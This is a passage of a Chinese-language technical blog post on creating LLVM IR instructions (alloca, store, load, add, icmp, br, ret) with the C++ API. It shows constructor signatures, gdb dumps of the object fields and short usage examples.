invariant&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>🌰，Align也可以在创建AllocaInst之后设置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">ptr3-&gt;<span class="hljs-built_in">setAlignment</span>(<span class="hljs-built_in">Align</span>(<span class="hljs-number">4</span>));<br></code></pre></td></tr></table></figure></li></ul><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">AllocaInst *ptr3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">AllocaInst</span>(IntegerType::<span class="hljs-built_in">get</span>(context, <span class="hljs-number">32</span>), <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getDataLayout</span>().<span class="hljs-built_in">getAllocaAddrSpace</span>(),<span class="hljs-string">&quot;&quot;</span>,entryBlock);<br>ptr3-&gt;<span class="hljs-built_in">setAlignment</span>(<span class="hljs-built_in">Align</span>(<span class="hljs-number">4</span>));<br></code></pre></td></tr></table></figure><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>store命令是StoreInst类型</p><p>比Instruction多了一个SSID</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$<span class="hljs-number">4</span> = &#123;<br>  &lt;llvm::Instruction&gt; = &#123;<br>    &lt;llvm::User&gt; = &#123;<br>      &lt;llvm::Value&gt; = &#123;<br>        VTy = <span class="hljs-number">0x466c00</span>,<br>        UseList = <span class="hljs-number">0x0</span>,<br>        SubclassID = <span class="hljs-number">59</span> <span class="hljs-string">&#x27;;&#x27;</span>,<br>        HasValueHandle = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>        SubclassOptionalData = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>        SubclassData = <span class="hljs-number">4</span>,<br>        NumUserOperands = <span class="hljs-number">2</span>,<br>        IsUsedByMD = <span class="hljs-number">0</span>,<br>        HasName = <span class="hljs-number">0</span>,<br>        HasMetadata = <span class="hljs-number">0</span>,<br>        HasHungOffUses = <span class="hljs-number">0</span>,<br>        HasDescriptor = <span class="hljs-number">0</span>,<br>        <span class="hljs-type">static</span> MaxAlignmentExponent = <span class="hljs-number">29</span>,<br>        <span class="hljs-type">static</span> MaximumAlignment = <span class="hljs-number">536870912</span><br>      &#125;, &lt;No data fields&gt;&#125;, <br>    &lt;llvm::ilist_node_with_parent&lt;llvm::Instruction, llvm::BasicBlock&gt;&gt; = &#123;<br>      &lt;llvm::ilist_node&lt;llvm::Instruction&gt;&gt; = &#123;<br>        &lt;llvm::ilist_node_impl&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-type">void</span>&gt; &gt;&gt; = &#123;<br>          &lt;llvm::ilist_node_base&lt;<span class="hljs-literal">false</span>&gt;&gt; = &#123;<br>            Prev = <span class="hljs-number">0x470d48</span>,<br>            Next = <span class="hljs-number">0x46abd8</span><br>          &#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, <br>    members of llvm::Instruction:<br>    Parent = <span class="hljs-number">0x46abb0</span>,<br>    DbgLoc = &#123;<br>      Loc = &#123;<br>        Ref = &#123;<br>          MD = <span class="hljs-number">0x0</span><br>        &#125;<br>      &#125;<br>    &#125;,<br>    Order = <span class="hljs-number">0</span><br>  &#125;, <br>  members of llvm::StoreInst:<br>  SSID = <span class="hljs-number">1</span> <span class="hljs-string">&#x27;\001&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以通过构造函数新建一个StoreInst</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, Instruction *InsertBefore);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Instruction *InsertBefore);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Align Align,<br>            Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Align Align,<br>            BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Align Align,<br>            AtomicOrdering Order, SyncScope::ID SSID = SyncScope::System,<br>            Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Align Align,<br>            AtomicOrdering Order, SyncScope::ID SSID, BasicBlock *InsertAtEnd);<br></code></pre></td></tr></table></figure><ul><li>将Val存入Ptr</li><li>isVolatile表示是否优化</li></ul><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">StoreInst *st0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">StoreInst</span>(param1, ptr4, <span class="hljs-literal">false</span>, entryBlock);<br>st0-&gt;<span class="hljs-built_in">setAlignment</span>(<span class="hljs-built_in">Align</span>(<span class="hljs-number">4</span>));<br></code></pre></td></tr></table></figure><h2 id="load"><a href="#load" class="headerlink" title="load"></a>load</h2><p>load是LoadInst类型，也比Instruction多一个SSID</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$<span class="hljs-number">5</span> = &#123;<br>  &lt;llvm::UnaryInstruction&gt; = &#123;<br>    &lt;llvm::Instruction&gt; = &#123;<br>      &lt;llvm::User&gt; = &#123;<br>        &lt;llvm::Value&gt; = &#123;<br>          VTy = <span class="hljs-number">0x466d80</span>,<br>          UseList = <span class="hljs-number">0x0</span>,<br>          SubclassID = <span class="hljs-number">58</span> <span class="hljs-string">&#x27;:&#x27;</span>,<br>          HasValueHandle = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassOptionalData = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassData = <span class="hljs-number">4</span>,<br>          NumUserOperands = <span class="hljs-number">1</span>,<br>          IsUsedByMD = <span class="hljs-number">0</span>,<br>          HasName = <span class="hljs-number">0</span>,<br>          HasMetadata = <span class="hljs-number">0</span>,<br>          HasHungOffUses = <span class="hljs-number">0</span>,<br>          HasDescriptor = <span class="hljs-number">0</span>,<br>          <span class="hljs-type">static</span> MaxAlignmentExponent = <span class="hljs-number">29</span>,<br>          <span class="hljs-type">static</span> MaximumAlignment = <span class="hljs-number">536870912</span><br>        &#125;, &lt;No data fields&gt;&#125;, <br>      &lt;llvm::ilist_node_with_parent&lt;llvm::Instruction, llvm::BasicBlock&gt;&gt; = &#123;<br>        &lt;llvm::ilist_node&lt;llvm::Instruction&gt;&gt; = &#123;<br>          &lt;llvm::ilist_node_impl&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-type">void</span>&gt; &gt;&gt; = &#123;<br>            &lt;llvm::ilist_node_base&lt;<span class="hljs-literal">false</span>&gt;&gt; = &#123;<br>              Prev = <span class="hljs-number">0x4686c8</span>,<br>              Next = <span class="hljs-number">0x46abd8</span><br>            &#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, <br>      members of llvm::Instruction:<br>      Parent = <span class="hljs-number">0x46abb0</span>,<br>      DbgLoc = &#123;<br>        Loc = &#123;<br>          Ref = &#123;<br>            MD = <span class="hljs-number">0x0</span><br>          &#125;<br>        &#125;<br>      &#125;,<br>      Order = <span class="hljs-number">0</span><br>    &#125;, &lt;No data fields&gt;&#125;, <br>  members of llvm::LoadInst:<br>  SSID = <span class="hljs-number">1</span> <span class="hljs-string">&#x27;\001&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>构造函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr,<br>           Instruction *InsertBefore);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Instruction *InsertBefore);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Align Align, Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Align Align, BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Align Align, AtomicOrdering Order,<br>           SyncScope::ID SSID = SyncScope::System,<br>           Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Align Align, AtomicOrdering Order, SyncScope::ID SSID,<br>           BasicBlock *InsertAtEnd);<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LoadInst *ld0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">LoadInst</span>(IntegerType::<span class="hljs-built_in">get</span>(context, <span class="hljs-number">32</span>), ptr4, <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-literal">false</span>, entryBlock);<br>ld0-&gt;<span class="hljs-built_in">setAlignment</span>(<span class="hljs-built_in">Align</span>(<span class="hljs-number">4</span>));<br></code></pre></td></tr></table></figure><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>add的类型是BinaryOperator，没有自己的data域</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> BinaryOperator *<span class="hljs-title">Create</span><span class="hljs-params">(BinaryOps Op, Value *S1, Value *S2,</span></span><br><span class="hljs-params"><span class="hljs-function">                              <span class="hljs-type">const</span> Twine &amp;Name = Twine(),</span></span><br><span class="hljs-params"><span class="hljs-function">                              Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BinaryOperator *<span class="hljs-title">Create</span><span class="hljs-params">(BinaryOps Op, Value *S1, Value *S2,</span></span><br><span class="hljs-params"><span class="hljs-function">                              <span class="hljs-type">const</span> Twine &amp;Name, BasicBlock *InsertAtEnd)</span></span>;<br></code></pre></td></tr></table></figure><p>BinaryOps</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-keyword">enum</span> <span class="hljs-title class_">BinaryOps</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  FIRST_BINARY_INST(N)             BinaryOpsBegin = N,</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HANDLE_BINARY_INST(N, OPC, CLASS) OPC = N,</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   LAST_BINARY_INST(N)             BinaryOpsEnd = N+1</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Instruction.def&quot;</span></span><br>  &#125;;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">BinaryOperator *add1 = BinaryOperator::<span class="hljs-built_in">Create</span>(Instruction::Add, ld0, ld1, <span class="hljs-string">&quot;&quot;</span>, entryBlock);<br></code></pre></td></tr></table></figure><h2 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h2><p>icmp的类型是ICmpInst，没有自己的data域</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-comment">/// Constructor with insert-before-instruction semantics.</span><br>  <span class="hljs-built_in">ICmpInst</span>(<br>    Instruction *InsertBefore,  <span class="hljs-comment">///&lt; Where to insert</span><br>    Predicate pred,  <span class="hljs-comment">///&lt; The predicate to use for the comparison</span><br>    Value *LHS,      <span class="hljs-comment">///&lt; The left-hand-side of the expression</span><br>    Value *RHS,      <span class="hljs-comment">///&lt; The right-hand-side of the expression</span><br>    <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment">///&lt; Name of the instruction</span><br>  ) : <span class="hljs-built_in">CmpInst</span>(<span class="hljs-built_in">makeCmpResultType</span>(LHS-&gt;<span class="hljs-built_in">getType</span>()),<br>              Instruction::ICmp, pred, LHS, RHS, NameStr,<br>              InsertBefore) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br>  <span class="hljs-built_in">AssertOK</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  &#125;<br><br>  <span class="hljs-comment">/// Constructor with insert-at-end semantics.</span><br>  <span class="hljs-built_in">ICmpInst</span>(<br>    BasicBlock &amp;InsertAtEnd, <span class="hljs-comment">///&lt; Block to insert into.</span><br>    Predicate pred,  <span class="hljs-comment">///&lt; The predicate to use for the comparison</span><br>    Value *LHS,      <span class="hljs-comment">///&lt; The left-hand-side of the expression</span><br>    Value *RHS,      <span class="hljs-comment">///&lt; The right-hand-side of the expression</span><br>    <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment">///&lt; Name of the instruction</span><br>  ) : <span class="hljs-built_in">CmpInst</span>(<span class="hljs-built_in">makeCmpResultType</span>(LHS-&gt;<span class="hljs-built_in">getType</span>()),<br>              Instruction::ICmp, pred, LHS, RHS, NameStr,<br>              &amp;InsertAtEnd) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br>  <span class="hljs-built_in">AssertOK</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  &#125;<br><br>  <span class="hljs-comment">/// Constructor with no-insertion semantics</span><br>  <span class="hljs-built_in">ICmpInst</span>(<br>    Predicate pred, <span class="hljs-comment">///&lt; The predicate to use for the comparison</span><br>    Value *LHS,     <span class="hljs-comment">///&lt; The left-hand-side of the expression</span><br>    Value *RHS,     <span class="hljs-comment">///&lt; The right-hand-side of the expression</span><br>    <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment">///&lt; Name of the instruction</span><br>  ) : <span class="hljs-built_in">CmpInst</span>(<span class="hljs-built_in">makeCmpResultType</span>(LHS-&gt;<span class="hljs-built_in">getType</span>()),<br>              Instruction::ICmp, pred, LHS, RHS, NameStr) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br>  <span class="hljs-built_in">AssertOK</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  &#125;<br></code></pre></td></tr></table></figure><p>Predicate是比较的类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Predicate</span> : <span class="hljs-type">unsigned</span> &#123;<br>  <span class="hljs-comment">// Opcode            U L G E    Intuitive operation</span><br>  FCMP_FALSE = <span class="hljs-number">0</span>, <span class="hljs-comment">///&lt; 0 0 0 0    Always false (always folded)</span><br>  FCMP_OEQ = <span class="hljs-number">1</span>,   <span class="hljs-comment">///&lt; 0 0 0 1    True if ordered and equal</span><br>  FCMP_OGT = <span class="hljs-number">2</span>,   <span class="hljs-comment">///&lt; 0 0 1 0    True if ordered and greater than</span><br>  FCMP_OGE = <span class="hljs-number">3</span>,   <span class="hljs-comment">///&lt; 0 0 1 1    True if ordered and greater than or equal</span><br>  FCMP_OLT = <span class="hljs-number">4</span>,   <span class="hljs-comment">///&lt; 0 1 0 0    True if ordered and less than</span><br>  FCMP_OLE = <span class="hljs-number">5</span>,   <span class="hljs-comment">///&lt; 0 1 0 1    True if ordered and less than or equal</span><br>  FCMP_ONE = <span class="hljs-number">6</span>,   <span class="hljs-comment">///&lt; 0 1 1 0    True if ordered and operands are unequal</span><br>  FCMP_ORD = <span class="hljs-number">7</span>,   <span class="hljs-comment">///&lt; 0 1 1 1    True if ordered (no nans)</span><br>  FCMP_UNO = <span class="hljs-number">8</span>,   <span class="hljs-comment">///&lt; 1 0 0 0    True if unordered: isnan(X) | isnan(Y)</span><br>  FCMP_UEQ = <span class="hljs-number">9</span>,   <span class="hljs-comment">///&lt; 1 0 0 1    True if unordered or equal</span><br>  FCMP_UGT = <span class="hljs-number">10</span>,  <span class="hljs-comment">///&lt; 1 0 1 0    True if unordered or greater than</span><br>  FCMP_UGE = <span class="hljs-number">11</span>,  <span class="hljs-comment">///&lt; 1 0 1 1    True if unordered, greater than, or equal</span><br>  FCMP_ULT = <span class="hljs-number">12</span>,  <span class="hljs-comment">///&lt; 1 1 0 0    True if unordered or less than</span><br>  FCMP_ULE = <span class="hljs-number">13</span>,  <span class="hljs-comment">///&lt; 1 1 0 1    True if unordered, less than, or equal</span><br>  FCMP_UNE = <span class="hljs-number">14</span>,  <span class="hljs-comment">///&lt; 1 1 1 0    True if unordered or not equal</span><br>  FCMP_TRUE = <span class="hljs-number">15</span>, <span class="hljs-comment">///&lt; 1 1 1 1    Always true (always folded)</span><br>  FIRST_FCMP_PREDICATE = FCMP_FALSE,<br>  LAST_FCMP_PREDICATE = FCMP_TRUE,<br>  BAD_FCMP_PREDICATE = FCMP_TRUE + <span class="hljs-number">1</span>,<br>  ICMP_EQ = <span class="hljs-number">32</span>,  <span class="hljs-comment">///&lt; equal</span><br>  ICMP_NE = <span class="hljs-number">33</span>,  <span class="hljs-comment">///&lt; not equal</span><br>  ICMP_UGT = <span class="hljs-number">34</span>, <span class="hljs-comment">///&lt; unsigned greater than</span><br>  ICMP_UGE = <span class="hljs-number">35</span>, <span class="hljs-comment">///&lt; unsigned greater or equal</span><br>  ICMP_ULT = <span class="hljs-number">36</span>, <span class="hljs-comment">///&lt; unsigned less than</span><br>  ICMP_ULE = <span class="hljs-number">37</span>, <span class="hljs-comment">///&lt; unsigned less or equal</span><br>  ICMP_SGT = <span class="hljs-number">38</span>, <span class="hljs-comment">///&lt; signed greater than</span><br>  ICMP_SGE = <span class="hljs-number">39</span>, <span class="hljs-comment">///&lt; signed greater or equal</span><br>  ICMP_SLT = <span class="hljs-number">40</span>, <span class="hljs-comment">///&lt; signed less than</span><br>  ICMP_SLE = <span class="hljs-number">41</span>, <span class="hljs-comment">///&lt; signed less or equal</span><br>  FIRST_ICMP_PREDICATE = ICMP_EQ,<br>  LAST_ICMP_PREDICATE = ICMP_SLE,<br>  BAD_ICMP_PREDICATE = ICMP_SLE + <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">ICmpInst *icmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ICmpInst</span>(*entryBlock, ICmpInst::ICMP_SGT, add1, ConstantInt::<span class="hljs-built_in">get</span>(context, <span class="hljs-built_in">APInt</span>(<span class="hljs-number">32</span>, <span class="hljs-number">100</span>));<br></code></pre></td></tr></table></figure><p>需要常数可以创建ConstantInt</p><h2 id="br"><a href="#br" class="headerlink" title="br"></a>br</h2><p>BranchInst，无data域</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> BranchInst *<span class="hljs-title">Create</span><span class="hljs-params">(BasicBlock *IfTrue,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">BranchInst</span>(IfTrue, InsertBefore);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BranchInst *<span class="hljs-title">Create</span><span class="hljs-params">(BasicBlock *IfTrue, BasicBlock *IfFalse,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Value *Cond, Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">3</span>) <span class="hljs-built_in">BranchInst</span>(IfTrue, IfFalse, Cond, InsertBefore);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BranchInst *<span class="hljs-title">Create</span><span class="hljs-params">(BasicBlock *IfTrue, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">BranchInst</span>(IfTrue, InsertAtEnd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BranchInst *<span class="hljs-title">Create</span><span class="hljs-params">(BasicBlock *IfTrue, BasicBlock *IfFalse,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Value *Cond, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">3</span>) <span class="hljs-built_in">BranchInst</span>(IfTrue, IfFalse, Cond, InsertAtEnd);<br>&#125;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">BranchInst::<span class="hljs-built_in">Create</span>(block10,block19,icmp,entryBlock);<br></code></pre></td></tr></table></figure><h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>ReturnInst，无data域</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">static</span> ReturnInst* <span class="hljs-title">Create</span><span class="hljs-params">(LLVMContext &amp;C, Value *retVal = <span class="hljs-literal">nullptr</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                            Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(!!retVal) <span class="hljs-built_in">ReturnInst</span>(C, retVal, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> ReturnInst* <span class="hljs-title">Create</span><span class="hljs-params">(LLVMContext &amp;C, Value *retVal,</span></span><br><span class="hljs-params"><span class="hljs-function">                            BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(!!retVal) <span class="hljs-built_in">ReturnInst</span>(C, 